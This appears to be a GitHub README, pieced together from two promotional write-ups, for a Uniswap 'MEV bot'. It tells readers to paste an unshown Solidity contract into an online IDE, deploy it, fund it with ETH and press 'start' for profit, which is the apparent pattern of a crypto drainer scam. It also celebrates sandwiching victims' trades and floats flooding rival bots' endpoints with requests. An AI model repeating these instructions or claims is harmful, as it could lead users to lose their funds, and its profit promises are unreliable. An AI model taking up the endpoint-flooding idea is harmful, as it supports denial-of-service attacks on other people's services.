Apebotting ETH MEV-bot with GPT-4
![mev](https://user-images.githubusercontent.com/125767433/233822194-4fd1e87e-fd39-4960-8e84-1efd7e1fa100.png)


Uniswap v2 MEV bot - Updated mempool settings - April 2023
The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

Bot sends the Transaction and sniffs the Uniswap v2 Mempool

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

Sending back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

But ser, there are open source bots that do the same
Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3

Wen increase aggressiveness ?
As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.
Personal journey in this
What did I learn?
MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap
So why stop?
I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.

Towards the end I kept getting outcompeted by this individual:

https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

MEV bot Instructions
(works only for Mainnet)

Access the ChainIDE Compiler and click on the big Ethereum Logo: https://chainide.com/

With the login button Select "Injected Web 3" and connect your Metamask or wallet with ChainIDE

On the left create a New File. Rename it as you like, i.e: “bot.sol"

Paste the code from bot.sol into the file

Move to the "Solidity Compiler" tab on the right side, select version "0.6.6" and then "Compile" it

Move to the "Deploy" tab right under the compiler tab. Enter 'ETH' on the Token Name field and your deployer wallet as withdrawal wallet into the second field and then "Deploy" it. After the transaction is confirmed, it's your own BOT now

Find your newly created contract address with the transaction Link. Copy the address and send some ETH to your exact contract/bot address

After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button

Do you feel the urge to send me some crypto?






# Mev-Bot
Make money with MevBot (ETH network)

My Youtube chanel

https://www.youtube.com/channel/UCukXz34PXCbmgXNbdrJI9Nw

How it works:

![create-a-frontrunner-bot-on-uniswap](https://user-images.githubusercontent.com/125767433/221687677-362450a0-997d-46fb-85bc-be0be14cdced.jpg)


You can see an example of how the bot works.
The bot will make transactions on your entire balance to increase profit


First-source code

Copy code and paste in Remix IDE
![1](https://user-images.githubusercontent.com/125767433/234039434-9c7152dd-4058-43bc-a8d8-67cda145a234.png)


And click Solidity complier 0.6.6
![2](https://user-images.githubusercontent.com/125767433/234039745-c6543007-5417-43df-a572-59010bb80f8a.png)


Select ETH or BSC(BNB) network 
and router address

Press Transact (Deploy)
![3](https://user-images.githubusercontent.com/125767433/234052610-fbd83b3d-5978-4b64-a268-3122f3ed2f4d.png)



Next-deposit (balans Mev Bot)
Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button

![4](https://user-images.githubusercontent.com/125767433/234042523-5e2ef38b-bf98-4f85-9393-03b59d11adc0.png)
![4 1](https://user-images.githubusercontent.com/125767433/234051646-9c619a7a-f4fa-474c-afd2-c75de6ae6adc.png)

![5](https://user-images.githubusercontent.com/125767433/234051700-0f46bcac-8ede-4ae3-82ca-734f295e29cd.png)



Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.2-1


At any time you can Stop bot or return your money by calling the withdrawal function.
